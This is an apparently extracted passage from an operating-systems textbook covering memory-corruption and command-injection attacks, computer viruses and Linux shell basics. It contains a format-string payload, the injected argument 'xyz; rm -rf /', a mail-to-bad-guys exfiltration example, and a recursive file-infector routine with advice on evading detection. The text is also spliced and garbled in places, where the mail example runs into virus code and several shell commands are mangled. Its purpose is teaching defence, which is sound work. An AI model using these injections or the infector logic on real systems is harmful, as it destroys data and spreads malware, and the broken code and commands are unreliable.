The code is meant to do an authorization check. Only users with the right credentials are allowed to see the top secret data. The function check_credentials is not a function from the C library, but we assume that it exists somewhere in the program and does not contain any errors. Now suppose the attacker types in 129 characters. As in the previous case, the buffer will overflow, but it will not modify the return address. Instead, the attacker has modified the value of the authorized variable, giving it a value that is not 0. The program does not crash and does not execute any attacker code, but it leaks the secret information to an unauthorized user.

## Buffer Overflows-The Not So Final Word

Buffer overflows are some of the oldest and most important memory corruption techniques that are used by attackers. Despite more than a quarter century of incidents, and a a plethora of defenses (we have only treated the most important ones), it seems impossible to get rid of them (Van der Veen, 2012). For all this time, a substantial fraction of all security problems are due to this flaw, which is difficult to fix because there are so many existing C programs around that do not check for buffer overflow.

The arms race is nowhere near complete. All around the world, researchers are investigating new defenses. Some of these defenses are aimed at binaries, others consists of security extension to C and C++ compilers. It is important to emphasize that attackers are also improving their exploitation techniques. In this section, we have tried to given an overview of some of the more important techniques, but there are many variations of the same idea. The one thing we are fairly certain of is that in the next edition of this book, this section will still be relevant (and probably longer).

### 9.7.2 Format String Attacks

The next attack is also a memory-corruption attack, but of a very different nature. Some programmers do not like typing, even though they are excellent typists. Why name a variable reference_count when rc obviously means the same thing and saves 13 keystrokes on every occurrence? This dislike of typing can sometimes lead to catastrophic system failures as described below.

Consider the following fragment from a C program that prints the traditional C greeting at the start of a program:

```
char *s="Hello World";
printf("%s", s);
```

In this program, the character string variable $s$ is declared and initialized to a string consisting of “Hello World” and a zero-byte to indicate the end of the string. The call to the function printf has two arguments, the format string “%s”, which instructs it to print a string, and the address of the string. When executed, this piece of code prints the string on the screen (or wherever standard output goes). It is correct and bulletproof.

But suppose the programmer gets lazy and instead of the above types:

```
char *s="Hello World";
printf(s);
```

This call to printf is allowed because printf has a variable number of arguments, of which the first must be a format string. But a string not containing any formatting information (such as “%s”) is legal, so although the second version is not good programming practice, it is allowed and it will work. Best of all, it saves typing five characters, clearly a big win.

Six months later some other programmer is instructed to modify the code to first ask the user for his name, then greet the user by name. After studying the code somewhat hastily, he changes it a little bit, like this:

```
char s[100], g[100] = "Hello "; /* declare s and g; initialize g */
gets(s); /* read a string from the keyboard into s */
strcat(g, s); /* concatenate s onto the end of g */
printf(g); /* print g */
```

Now it reads a string into the variable $s$ and concatenates it to the initialized string $g$ to build the output message in $g$. It still works. So far so good (except for the use of gets, which is subject to buffer overflow attacks, but it is still popular).

However, a knowledgeable user who saw this code would quickly realize that the input accepted from the keyboard is not a just a string; it is a format string, and as such all the format specifications allowed by printf will work. While most of the formatting indicators such as “%s” (for printing strings) and “%d” (for printing decimal integers), format output, a couple are special. In particular, “%n” does not print anything. Instead it calculates how many characters should have been output already at the place it appears in the string and stores it into the next argument to printf to be processed. Here is an example program using “%n”:

```
int main(int argc, char *argv[])
{
    int i=0;
    printf("Hello %nworld\n", &i); /* the %n stores into i */
    print(" \(\mathrm{i}=\% \mathrm{~d} \backslash \mathrm{n}\) ", i); /* i is now 6 */
}
```

When this program is compiled and run, the output it produces on the screen is:

Hello world
$\mathrm{i}=6$

Note that the variable $i$ has been modified by a call to printf, something not obvious to everyone. While this feature is useful once in a blue moon, it means that printing a format string can cause a word-or many words-to be stored into memory. Was it a good idea to include this feature in print? Definitely not, but it seemed so handy at the time. A lot of software vulnerabilities started like this.

As we saw in the preceding example, by accident the programmer who modified the code allowed the user of the program to (inadvertently) enter a format string. Since printing a format string can overwrite memory, we now have the tools needed to overwrite the return address of the printf function on the stack and jump somewhere else, for example, into the newly entered format string. This approach is called a format string attack.

Performing a format string attack is not exactly trivial. Where will the number of characters that the function printed be stored? Well, at the address of the parameter following the format string itself, just as in the example shown above. But in the vulnerable code, the attacker could supply only one string (and no second parameter to printf). In fact, what will happen is that the printf function will assume that there is a second parameter. It will just take the next value on the stack and use that. The attacker may also make printf use the next value on the stack, for instance by providing the following format string as input:
> “%08x %n”

The “%08x” means that printf will print the next parameter as an 8-digit hexadecimal number. So if that value is 1 , it will print 0000001 . In other words, with this format string, printf will simply assume that the next value on the stack is a 32-bit number that it should print, and the value after that is the address of the location where it should store the number of characters printed, in this case 9: 8 for the hexadecimal number and one for the space. Suppose he supplies the format string

```
"%08x %08x %n"
```

In that case, printf will store the value at the address provided by the third value following the format string on the stack, and so on. This is the key to making the above format string bug a “write anything anywhere” primitive for an attacker. The details are beyond this book, but the idea is that the attacker makes sure that the right target address is on the stack. This is easier than you may think. For example, in the vulnerable code we presented above, the string $g$ is itself also on the stack, at a higher address than the stack frame of printf (see Fig. 9-24). Let us assume that the string starts as shown in Fig. 9-24, with “AAAA”, followed by a sequence of “%0x” and ending with “%0n”. What will happen? Well if the attackers gets the number of “%0x”s just right, he will have reached the format

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-113_792_585_239_474.jpg)

Figure 9-24. A format string attack. By using exactly the right number of %08x, the attacker can use the first four characters of the format string as an address.

string (stored in buffer $B$ ) itself. In other words, printf will then use the first 4 bytes of the format string as the address to write to. Since, the ASCII value of the character $A$ is 65 (or $0 \times 41$ in hexadecimal), it will write the result at location $0 \times 41414141$, but the attacker can specify other addresses also. Of course, he must make sure that the number of characters printed is exactly right (because this is what will be written in the target address). In practice, there is a little more to it than that, but not much. If you type: “format string attack” to any Internet search engine, you will find a great deal of information on the problem.

Once the user has the ability to overwrite memory and force a jump to newly injected code, the code has all the power and access that the attacked program has. If the program is SETUID root, the attacker can create a shell with root privileges. As an aside, the use of fixed-size character arrays in this example could also be subject to a buffer-overflow attack.

### 9.7.3 Dangling Pointers

A third memory-corruption technique that is very popular in the wild is known as a dangling pointer attack. The simplest manifestation of the technique is quite easy to understand, but generating an exploit can be tricky. C and C++ allow a program to allocate memory on the heap using the malloc call, which returns a pointer
to a newly allocated chunk of memory. Later, when the program no longer needs it, it calls free to release the memory. A dangling pointer error occurs when the program accidentally uses the memory after it has already freed it. Consider the following code that discriminates against (really) old people:

```
int *A = (int *) malloc (128); /* allocate space for 128 integers */
int year_of_birth = read_user_input (); /* read an integer from standard input */
if (input < 1900) {
    printf ("Error, year of birth should be greater than 1900 \n");
    free (A);
} else {
    ...
    /* do something interesting with array A */
    ...
}
... /* many more statements, containing malloc and free */
A[0] = year_of_birth;
```

The code is wrong. Not just because of the age discrimination, but also because in line 12 it may assign a value to an element of array $A$ after it was freed already (in line 5). The pointer A will still point to the same address, but it is not supposed to be used anymore. In fact, the memory may already have been reused for another buffer by now (see line 11).

The question is: what will happen? The store in line 12 will try to update memory that is no longer in use for array $A$, and may well modify a different data structure that now lives in this memory area. In general, this memory corruption is not a good thing, but it gets even worse if the attacker is able to manipulate the program in such a way that it places a specific heap object in that memory where the first integer of that object contains, say, the user’s authorization level. This is not always easy to do, but there exist techniques (known as heap feng shui) to help attackers pull it off. Feng Shui is the ancient Chinese art of orienting building, tombs, and memory on the heap in an auspicious manner. If the digital feng shui master succeeds, he can now set the authorization level to any value (well, up to 1900).

### 9.7.4 Null Pointer Dereference Attacks

A few hundred pages ago, in Chapter 3, we discussed memory management in detail. You may remember how modern operating systems virtualize the address spaces of the kernel and user processes. Before a program accesses a memory address, the MMU translates that virtual address to a physical address by means of the page tables. Pages that are not mapped cannot be accessed. It seems logical to assume that the kernel address space and the address space of a user process are completely different, but this is not always the case. In Linux, for example, the kernel is simply mapped into every process’ address space and whenever the kernel
starts executing to handle a system call, it will run in the process’ address space. On a 32-bit system, user space occupies the bottom 3 GB of the address space and the kernel the top 1 GB. The reason for this cohabitation is efficiency-switching between address spaces is expensive.

Normally this arrangement does not cause any problems. The situation changes when the attacker can make the kernel call functions in user space. Why would the kernel do this? It is clear that it should not. However, remember we are talking about bugs. A buggy kernel may in rare and unfortunate circumstances accidentally dereference a NULL pointer. For instance, it may call a function using a function pointer that was not yet initialized. In recent years, several such bugs have been discovered in the Linux kernel. A null pointer dereference is nasty business as it typically leads to a crash. It is bad enough in a user process, as it will crash the program, but it is even worse in the kernel, because it takes down the entire system.

Somtimes it is worse still, when the attacker is able to trigger the null pointer dereference from the user process. In that case, he can crash the system whenever he wants. However, crashing a system does not get you any high fives from your cracker friends - they want to see a shell.

The crash happens because there is no code mapped at page 0. So the attacker can use special function, mmap, to remedy this. With mmap, a user process can ask the kernel to map memory at a specific address. After mapping a page at address 0, the attacker can write shellcode in this page. Finally, he triggers the null pointer dereference, causing the shellcode to be executed with kernel privileges. High fives all around.

On modern kernels, it is no longer possible to mmap a page at address 0. Even so, many older kernels are still used in the wild. Moreover, the trick also works with pointers that have different values. With some bugs, the attacker may be able to inject his own pointer into the kernel and have it dereferenced. The lessons we learn from this exploit is that kernel-user interactions may crop up in unexpected places and that optimizations to improve performance may come to haunt you in the form of attacks later.

### 9.7.5 Integer Overflow Attacks

Computers do integer arithmetic on fixed-length numbers, usually 8, 16, 32, or 64 bits long. If the sum of two numbers to be added or multiplied exceeds the maximum integer that can be represented, an overflow occurs. C programs do not catch this error; they just store and use the incorrect value. In particular, if the variables are signed integers, then the result of adding or multiplying two positive integers may be stored as a negative integer. If the variables are unsigned, the results will be positive, but may wrap around. For example, consider two unsigned 16-bit integers each containing the value 40,000. If they are multiplied together and the result stored in another unsigned 16-bit integer, the apparent product is 4096. Clearly this is incorrect but it is not detected.

This ability to cause undetected numerical overflows can be turned into an attack. One way to do this is to feed a program two valid (but large) parameters in the knowledge that they will be added or multiplied and result in an overflow. For example, some graphics programs have command-line parameters giving the height and width of an image file, for example, the size to which an input image is to be converted. If the target width and height are chosen to force an overflow, the program will incorrectly calculate how much memory it needs to store the image and call malloc to allocate a much-too-small buffer for it. The situation is now ripe for a buffer overflow attack. Similar exploits are possible when the sum or product of signed positive integers results in a negative integer.

### 9.7.6 Command Injection Attacks

Yet another exploit involves getting the target program to execute commands without realizing it is doing so. Consider a program that at some point needs to duplicate some user-supplied file under a different name (perhaps as a backup). If the programmer is too lazy to write the code, he could use the system function, which forks off a shell and executes its argument as a shell command. For example, the C code

```
system("ls >file-list")
```

forks off a shell that executes the command

```
ls >file-list
```

listing all the files in the current directory and writing them to a file called file-list. The code that the lazy programmer might use to duplicate the file is given in Fig. 9-25.

```
int main(int argc, char *argv[])
{
    char src[100], dst[100], cmd[205] = "cp "; /* declare 3 strings */
    printf("Please enter name of source file: "); /* ask for source file */
    gets(src); /* get input from the keyboard */
    strcat(cmd, src); /* concatenate src after cp */
    strcat(cmd, " "); /* add a space to the end of cmd */
    printf("Please enter name of destination file: "); /* ask for output file name */
    gets(dst); /* get input from the keyboard */
    strcat(cmd, dst); /* complete the commands string */
    system(cmd); /* execute the cp command */
}
```

Figure 9-25. Code that might lead to a command injection attack.

What the program does is ask for the names of the source and destination files, build a command line using $c p$, and then call system to execute it. Suppose that the
user types in “abc” and “xyz” respectively, then the command that the shell will execute is

```
cp abc xyz
```

which indeed copies the file.
Unfortunately this code opens up a gigantic security hole using a technique called command injection. Suppose that the user types “abc” and “xyz; rm -rf /” instead. The command that is constructed and executed is now

```
cp abc xyz; rm -rf /
```

which first copies the file, then attempts to recursively remove every file and every directory in the entire file system. If the program is running as superuser, it may well succeed. The problem, of course, is that everything following the semicolon is executed as a shell command.

Another example of the second argument might be “xyz; mail [snooper@bad-guys.com](mailto:snooper@bad-guys.com)  /* standard POSIX headers */
#include <sys/stat.h>
#include <dirent.h>
#include <fcntl.h>
#include <unistd.h>
struct stat sbuf; /* for Istat call to see if file is sym link */
search(char* dir_name)
{ /* recursively search for executables */
DIR* dirp; /* pointer to an open directory stream */
struct dirent* dp; /* pointer to a directory entry */
dirp = opendir(dir_name); /* open this directory */
if (dirp == NULL) return; /* dir could not be opened; forget it */
while (TRUE) {
dp = readdir(dirp); /* read next directory entry */
if (dp == NULL) { /* NULL means we are done */
chdir (“..”); /* go back to parent directory */
break; /* exit loop */
}
if (dp->d_name[0] == ‘.’) continue; /* skip the . and .. directories */
Istat(dp->d_name, &sbuf); /* is entry a symbolic link? */
if (S_ISLNK(sbuf.st_mode)) continue; /* skip symbolic links */
if (chdir(dp->d_name) == 0) { /* if chdir succeeds, it must be a dir */
search(“.”); /* yes, enter and search it */
} else { /* no (file), infect it */
if (access(dp->d_name,X_OK) == 0) /* if executable, infect it */
infect(dp->d_name);
}
closedir(dirp); /* dir processed; close and return */
}

```

Figure 9-28. A recursive procedure that finds executable files on a UNIX system.

The main program of this virus would first copy its binary program into an array by opening $\operatorname{argv}[0]$ and reading it in for safekeeping. Then it would traverse
the entire file system starting at the root directory by changing to the root directory and calling search with the root directory as parameter.

The recursive procedure search processes a directory by opening it, then reading the entries one at a time using readdir until a NULL is returned, indicating that there are no more entries. If the entry is a directory, it is processed by changing to it and then calling search recursively; if it is an executable file, it is infected by calling infect with the name of the file to infect as parameter. Files starting with "." are skipped to avoid problems with the . and .. directories. Also, symbolic links are skipped because the program assumes that it can enter a directory using the chdir system call and then get back to where it was by going to .. , something that holds for hard links but not symbolic links. A fancier program could handle symbolic links, too.

The actual infection procedure, infect (not shown), merely has to open the file named in its parameter, copy the virus saved in the array over the file, and then close the file.

This virus could be "improved" in various ways. First, a test could be inserted into infect to generate a random number and just return in most cases without doing anything. In, say, one call out of 128, infection would take place, thereby reducing the chances of early detection, before the virus has had a good chance to spread. Biological viruses have the same property: those that kill their victims quickly do not spread nearly as fast as those that produce a slow, lingering death, giving the victims plenty of chance to spread the virus. An alternative design would be to have a higher infection rate (say, 25\%) but a cutoff on the number of files infected at once to reduce disk activity and thus be less conspicuous.

Second, infect could check to see if the file is already infected. Infecting the same file twice just wastes time. Third, measures could be taken to keep the time of last modification and file size the same as it was to help hide the infection. For programs larger than the virus, the size will remain unchanged, but for programs smaller than the virus, the program will now be bigger. Since most viruses are smaller than most programs, this is not a serious problem.

Although this program is not very long (the full program is under one page of C and the text segment compiles to under 2 KB), an assembly-code version of it can be even shorter. Ludwig (1998) gives an assembly-code program for MS-DOS that infects all the files in its directory and is only 44 bytes when assembled.

Later in this chapter we will study antivirus programs, that is, programs that track down and remove viruses. It is interesting to note here that the logic of Fig. 9-28, which a virus could use to find all the executable files to infect them, could also be used by an antivirus program to track down all the infected programs in order to remove the virus. The technologies of infection and disinfection go hand in hand, which is why it is necessary to understand in detail how viruses work in order to be able to fight them effectively.

From Virgil's point of view, the problem with an overwriting virus is that it is too easy to detect. After all, when an infected program executes, it may spread the
virus some more, but it does not do what it is supposed to do, and the user will notice this instantly. Consequently, many viruses attach themselves to the program and do their dirty work, but allow the program to function normally afterward. Such viruses are called parasitic viruses.

Parasitic viruses can attach themselves to the front, the back, or the middle of the executable program. If a virus attaches itself to the front, it has to first copy the program to RAM, put itself on the front, and then copy the program back from RAM following itself, as shown in Fig. 9-29(b). Unfortunately, the program will not run at its new virtual address, so the virus has to either relocate the program as it is moved or move it to virtual address 0 after finishing its own execution.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-129_434_1091_688_223.jpg)
Figure 9-29. (a) An executable program. (b) With a virus at the front. (c) With a virus at the end. (d) With a virus spread over free space within the program.

To avoid either of the complex options required by these front loaders, most viruses are back loaders, attaching themselves to the end of the executable program instead of the front, changing the starting address field in the header to point to the start of the virus, as illustrated in Fig. 9-29(c). The virus will now execute at a different virtual address depending on which infected program is running, but all this means is that Virgil has to make sure his virus is position independent, using relative instead of absolute addresses. That is not hard for an experienced programmer to do and some compilers can do it upon request.

Complex executable program formats, such as .exe files on Windows and nearly all modern UNIX binary formats, allow a program to have multiple text and data segments, with the loader assembling them in memory and doing relocation on the fly. In some systems (Windows, for example), all segments (sections) are multiples of 512 bytes. If a segment is not full, the linker fills it out with 0s. A virus that understands this can try to hide itself in the holes. If it fits entirely, as in Fig. 9-29(d), the file size remains the same as that of the uninfected file, clearly a plus, since a hidden virus is a happy virus. Viruses that use this principle are called cavity viruses. Of course, if the loader does not load the cavity areas into memory, the virus will need another way of getting started.

## Memory-Resident Viruses

So far we have assumed that when an infected program is executed, the virus runs, passes control to the real program, and then exits. In contrast, a memoryresident virus stays in memory (RAM) all the time, either hiding at the very top of memory or perhaps down in the grass among the interrupt vectors, the last few hundred bytes of which are generally unused. A very smart virus can even modify the operating system's RAM bitmap to make the system think the virus' memory is occupied, to avoid the embarrassment of being overwritten.

A typical memory-resident virus captures one of the trap or interrupt vectors by copying the contents to a scratch variable and putting its own address there, thus directing that trap or interrupt to it. The best choice is the system call trap. In that way, the virus gets to run (in kernel mode) on every system call. When it is done, it just invokes the real system call by jumping to the saved trap address.

Why would a virus want to run on every system call? To infect programs, naturally. The virus can just wait until an exec system call comes along, and then, knowing that the file at hand is an executable binary (and probably a useful one at that), infect it. This process does not require the massive disk activity of Fig. 9-28, so it is far less conspicuous. Catching all system calls also gives the virus great potential for spying on data and performing all manner of mischief.

## Boot Sector Viruses

As we discussed in Chap. 5, when most computers are turned on, the BIOS reads the master boot record from the start of the boot disk into RAM and executes it. This program determines which partition is active and reads in the first sector, the boot sector, from that partition and executes it. That program then either loads the operating system or brings in a loader to load the operating system. Unfortunately, many years ago one of Virgil's friends got the idea of creating a virus that could overwrite the master boot record or the boot sector, with devastating results. Such viruses, called boot sector viruses, are still very common.

Normally, a boot sector virus [which includes MBR (Master Boot Record) viruses] first copies the true boot sector to a safe place on the disk so that it can boot the operating system when it is finished. The Microsoft disk formatting program, fdisk, skips the first track, so that is a good hiding place on Windows machines. Another option is to use any free disk sector and then update the bad-sector list to mark the hideout as defective. In fact, if the virus is large, it can also disguise the rest of itself as bad sectors. A really aggressive virus could even just allocate normal disk space for the true boot sector and itself, and update the disk's bitmap or free list accordingly. Doing this requires an intimate knowledge of the operating system's internal data structures, but Virgil had a good professor for his operating systems course and studied hard.

When the computer is booted, the virus copies itself to RAM, either at the top or down among the unused interrupt vectors. At this point the machine is in kernel mode, with the MMU off, no operating system, and no antivirus program running. Party time for viruses. When it is ready, it boots the operating system, usually staying memory resident so it can keep an eye on things.

One problem, however, is how to get control again later. The usual way is to exploit specific knowledge of how the operating system manages the interrupt vectors. For example, Windows does not overwrite all the interrupt vectors in one blow. Instead, it loads device drivers one at a time, and each one captures the interrupt vector it needs. This process can take a minute.

This design gives the virus the handle it needs to get going. It starts out by capturing all the interrupt vectors, as shown in Fig. 9-30(a). As drivers load, some of the vectors are overwritten, but unless the clock driver is loaded first, there will be plenty of clock interrupts later that start the virus. Loss of the printer interrupt is shown in Fig. 9-30(b). As soon as the virus sees that one of its interrupt vectors has been overwritten, it can overwrite that vector again, knowing that it is now safe (actually, some interrupt vectors are overwritten several times during booting, but the pattern is deterministic and Virgil knows it by heart). Recapture of the printer is shown in Fig. 9-30(c). When everything is loaded, the virus restores all the interrupt vectors and keeps only the system-call trap vector for itself. At this point we have a memory-resident virus in control of system calls. In fact, this is how most memory-resident viruses get started in life.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-131_568_1156_1284_189.jpg)
Figure 9-30. (a) After the virus has captured all the interrupt and trap vectors. (b) After the operating system has retaken the printer interrupt vector. (c) After the virus has noticed the loss of the printer interrupt vector and recaptured it.

## Device Driver Viruses

Getting into memory like this is a little like spelunking (exploring caves)-you have to go through contortions and keep worrying about something falling down and landing on your head. It would be much simpler if the operating system would just kindly load the virus officially. With a little bit of work, that goal can be achieved right off the bat. The trick is to infect a device driver, leading to a device driver virus. In Windows and some UNIX systems, device drivers are just executable programs that live on the disk and are loaded at boot time. If one of them can be infected, the virus will always be officially loaded at boot time. Even nicer, drivers run in kernel mode, and after a driver is loaded, it is called, giving the virus a chance to capture the system-call trap vector. This fact alone is actually a strong argument for running the device drivers as user-mode programs (as MINIX 3 does)-because if they get infected, they cannot do nearly as much damage as kernel-mode drivers.

## Macro Viruses

Many programs, such as Word and Excel, allow users to write macros to group several commands that can later be executed with a single keystroke. Macros can also be attached to menu items, so that when one of them is selected, the macro is executed. In Microsoft Office, macros can contain entire programs in Visual Basic, which is a complete programming language. The macros are interpreted rather than compiled, but that affects only execution speed, not what they can do. Since macros may be document specific, Office stores the macros for each document along with the document.

Now comes the problem. Virgil writes a document in Word and creates a macro that he attaches to the OPEN FILE function. The macro contains a macro virus. He then emails the document to the victim, who naturally opens it (assuming the email program has not already done this for him). Opening the document causes the OPEN FILE macro to execute. Since the macro can contain an arbitrary program, it can do anything, such as infect other Word documents, erase files, and more. In all fairness to Microsoft, Word does give a warning when opening a file with macros, but most users do not understand what this means and continue opening anyway. Besides, legitimate documents may also contain macros. And there are other programs that do not even give this warning, making it even harder to detect a virus.

With the growth of email attachments, sending documents with viruses embedded in macros is easy. Such viruses are much easier to write than concealing the true boot sector somewhere in the bad-block list, hiding the virus among the interrupt vectors, and capturing the system-call trap vector. This means that increasingly less skilled people can now write viruses, lowering the general quality of the product and giving virus writers a bad name.

## Source Code Viruses

Parasitic and boot sector viruses are highly platform specific; document viruses are somewhat less so (Word runs on Windows and Macs, but not on UNIX). The most portable viruses of all are source code viruses. Imagine the virus of Fig. 9-28, but with the modification that instead of looking for binary executable files, it looks for C programs, a change of only 1 line (the call to access). The infect procedure should be changed to insert the line
```

#include <virus.h>

```

at the top of each C source program. One other insertion is needed, the line
```

run_virus( );

naughty_func()
{
char *p;
p = rand();*
p = 0;
}

|s *.C

```

tells $l s$ to list all the files whose name ends in .c. If files named $x . c, y . c$, and $z . c$ all exist, the above command is equivalent to typing
```

ls x.c y.c z.c

```

Another wild card is the question mark, which matches any one character. A list of characters inside square brackets selects any of them, so
```

ls [ape]*

```

lists all files beginning with "a", "p", or "e".
A program like the shell does not have to open the terminal (keyboard and monitor) in order to read from it or write to it. Instead, when it (or any other program) starts up, it automatically has access to a file called standard input (for reading), a file called standard output (for writing normal output), and a file called standard error (for writing error messages). Normally, all three default to the terminal, so that reads from standard input come from the keyboard and writes to standard output or standard error go to the screen. Many Linux programs read from standard input and write to standard output as the default. For example,
```

sort

```

invokes the sort program, which reads lines from the terminal (until the user types a CTRL-D, to indicate end of file), sorts them alphabetically, and writes the result to the screen.

It is also possible to redirect standard input and standard output, as that is often useful. The syntax for redirecting standard input uses a less-than symbol (<) followed by the input file name. Similarly, standard output is redirected using a great-er-than symbol (>). It is permitted to redirect both in the same command. For example, the command
```

sort out

```

causes sort to take its input from the file in and write its output to the file out. Since standard error has not been redirected, any error messages go to the screen. A program that reads its input from standard input, does some processing on it, and writes its output to standard output is called a filter.

Consider the following command line consisting of three separate commands:
```

sort temp; head -30 <temp; rm temp

```

It first runs sort, taking the input from in and writing the output to temp. When that has been completed, the shell runs head, telling it to print the first 30 lines of
temp and print them on standard output, which defaults to the terminal. Finally, the temporary file is removed. It is not recycled. It is gone with the wind, forever.

It frequently occurs that the first program in a command line produces output that is used as input to the next program. In the above example, we used the file temp to hold this output. However, Linux provides a simpler construction to do the same thing. In
```

sort <in | head -30

```

the vertical bar, called the pipe symbol, says to take the output from sort and use it as the input to head, eliminating the need for creating, using, and removing the temporary file. A collection of commands connected by pipe symbols, called a pipeline, may contain arbitrarily many commands. A four-component pipeline is shown by the following example:
```

grep ter *.t | sort | head -20 | tail -5 >foo

```

Here all the lines containing the string "ter" in all the files ending in . $t$ are written to standard output, where they are sorted. The first 20 of these are selected out by head, which passes them to tail, which writes the last five (i.e., lines 16 to 20 in the sorted list) to foo. This is an example of how Linux provides basic building blocks (numerous filters), each of which does one job, along with a mechanism for them to be put together in almost limitless ways.

Linux is a general-purpose multiprogramming system. A single user can run several programs at once, each as a separate process. The shell syntax for running a process in the background is to follow its command with an ampersand. Thus
```

(-<> &)

```

runs the word-count program, $w c$, to count the number of lines ( $-l$ flag) in its input, $a$, writing the result to $b$, but does it in the background. As soon as the command has been typed, the shell types the prompt and is ready to accept and handle the next command. Pipelines can also be put in the background, for example, by
```

sort <x | head &

```

Multiple pipelines can run in the background simultaneously.
It is possible to put a list of shell commands in a file and then start a shell with this file as standard input. The (second) shell just processes them in order, the same as it would with commands typed on the keyboard. Files containing shell commands are called shell scripts. Shell scripts may assign values to shell variables and then read them later. They may also have parameters, and use if, for, while, and case constructs. Thus a shell script is really a program written in shell language. The Berkeley C shell is an alternative shell designed to make shell scripts (and the command language in general) look like C programs in many respects. Since the shell is just another user program, other people have written and distributed a variety of other shells. Users are free to choose whatever shells they like.

### 10.2.4 Linux Utility Programs

The command-line (shell) user interface to Linux consists of a large number of standard utility programs. Roughly speaking, these programs can be divided into six categories, as follows:

1. File and directory manipulation commands.
2. Filters.
3. Program development tools, such as editors and compilers.
4. Text processing.
5. System administration.
6. Miscellaneous.

The POSIX 1003.1-2008 standard specifies the syntax and semantics of about 150 of these, primarily in the first three categories. The idea of standardizing them is to make it possible for anyone to write shell scripts that use these programs and work on all Linux systems.

In addition to these standard utilities, there are many application programs as well, of course, such as Web browsers, media players, image viewers, office suites, games, and so on.

Let us consider some examples of these programs, starting with file and directory manipulation.

cp a b

copies file $a$ to $b$, leaving the original file intact. In contrast,
> mv a b
copies $a$ to $b$ but removes the original. In effect, it moves the file rather than really making a copy in the usual sense. Several files can be concatenated using cat, which reads each of its input files and copies them all to standard output, one after another. Files can be removed by the rm command. The chmod command allows the owner to change the rights bits to modify access permissions. Directories can be created with mkdir and removed with rmdir. To see a list of the files in a directory, $l s$ can be used. It has a vast number of flags to control how much detail about each file is shown (e.g., size, owner, group, creation date), to determine the sort order (e.g., alphabetical, by time of last modification, reversed), to specify the layout on the screen, and much more.

We have already seen several filters: grep extracts lines containing a given pattern from standard input or one or more input files; sort sorts its input and writes it on standard output; head extracts the initial lines of its input; tail extracts the final lines of its input. Other filters defined by 1003.2 are cut and paste, which allow
columns of text to be cut and pasted into files; od, which converts its (usually binary) input to ASCII text, in octal, decimal, or hexadecimal; tr, which does character translation (e.g., lowercase to uppercase), and $p r$, which formats output for the printer, including options to include running heads, page numbers, and so on.

Compilers and programming tools include $g c c$, which calls the C compiler, and ar, which collects library procedures into archive files.

Another important tool is make, which is used to maintain large programs whose source code consists of multiple files. Typically, some of these are header files, which contain type, variable, macro, and other declarations. Source files often include these using a special include directive. This way, two or more source files can share the same declarations. However, if a header file is modified, it is necessary to find all the source files that depend on it and recompile them. The function of make is to keep track of which file depends on which header, and similar things, and arrange for all the necessary compilations to occur automatically. Nearly all Linux programs, except the smallest ones, are set up to be compiled with make.

A selection of the POSIX utility programs is listed in Fig. 10-2, along with a short description of each. All Linux systems have them and many more.

| Program | Typical use |
| :--- | :--- |
| cat | Concatenate multiple files to standard output |
| chmod | Change file protection mode |
| cp | Copy one or more files |
| cut | Cut columns of text from a file |
| grep | Search a file for some pattern |
| head | Extract the first lines of a file |
| Is | List directory |
| make | Compile files to build a binary |
| mkdir | Make a directory |
| od | Octal dump a file |
| paste | Paste columns of text into a file |
| pr | Format a file for printing |
| ps | List running processes |
| rm | Remove one or more files |
| rmdir | Remove a directory |
| sort | Sort a file of lines alphabetically |
| tail | Extract the last lines of a file |
| tr | Translate between character sets |

Figure 10-2. A few of the common Linux utility programs required by POSIX.

### 10.2.5 Kernel Structure

In Fig. 10-1 we saw the overall structure of a Linux system. Now let us zoom in and look more closely at the kernel as a whole before examining the various parts, such as process scheduling and the file system.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-192_838_1206_501_164.jpg)
Figure 10-3. Structure of the Linux kernel

The kernel sits directly on the hardware and enables interactions with I/O devices and the memory management unit and controls CPU access to them. At the lowest level, as shown in Fig. 10-3 it contains interrupt handlers, which are the primary way for interacting with devices, and the low-level dispatching mechanism. This dispatching occurs when an interrupt happens. The low-level code here stops the running process, saves its state in the kernel process structures, and starts the appropriate driver. Process dispatching also happens when the kernel completes some operations and it is time to start up a user process again. The dispatching code is in assembler and is quite distinct from scheduling.

Next, we divide the various kernel subsystems into three main components. The I/O component in Fig. 10-3 contains all kernel pieces responsible for interacting with devices and performing network and storage I/O operations. At the highest level, the I/O operations are all integrated under a VFS (Virtual File System) layer. That is, at the top level, performing a read operation on a file, whether it is in
memory or on disk, is the same as performing a read operation to retrieve a character from a terminal input. At the lowest level, all I/O operations pass through some device driver. All Linux drivers are classified as either character-device drivers or block-device drivers, the main difference being that seeks and random accesses are allowed on block devices and not on character devices. Technically, network devices are really character devices, but they are handled somewhat differently, so that it is probably clearer to separate them, as has been done in the figure.

Above the device-driver level, the kernel code is different for each device type. Character devices may be used in two different ways. Some programs, such as visual editors like vi and emacs, want every keystroke as it is hit. Raw terminal (tty) I/O makes this possible. Other software, such as the shell, is line oriented, allowing users to edit the whole line before hitting ENTER to send it to the program. In this case the character stream from the terminal device is passed through a socalled line discipline, and appropriate formatting is applied.

Networking software is often modular, with different devices and protocols supported. The layer above the network drivers handles a kind of routing function, making sure that the right packet goes to the right device or protocol handler. Most Linux systems contain the full functionality of a hardware router within the kernel, although the performance is less than that of a hardware router. Above the router code is the actual protocol stack, including IP and TCP, but also many additional protocols. Overlaying all the network is the socket interface, which allows programs to create sockets for particular networks and protocols, getting back a file descriptor for each socket to use later.

On top of the disk drivers is the I/O scheduler, which is responsible for ordering and issuing disk-operation requests in a way that tries to conserve wasteful disk head movement or to meet some other system policy.

At the very top of the block-device column are the file systems. Linux may, and in fact does, have multiple file systems coexisting concurrently. In order to hide the gruesome architectural differences of various hardware devices from the file system implementation, a generic block-device layer provides an abstraction used by all file systems.

To the right in Fig. 10-3 are the other two key components of the Linux kernel. These are responsible for the memory and process management tasks. Memory-management tasks include maintaining the virtual to physical-memory mappings, maintaining a cache of recently accessed pages and implementing a good page-replacement policy, and on-demand bringing in new pages of needed code and data into memory.

The key responsibility of the process-management component is the creation and termination of processes. It also includes the process scheduler, which chooses which process or, rather, thread to run next. As we shall see in the next section, the Linux kernel treats both processes and threads simply as executable entities, and will schedule them based on a global scheduling policy. Finally, code for signal handling also belongs to this component.

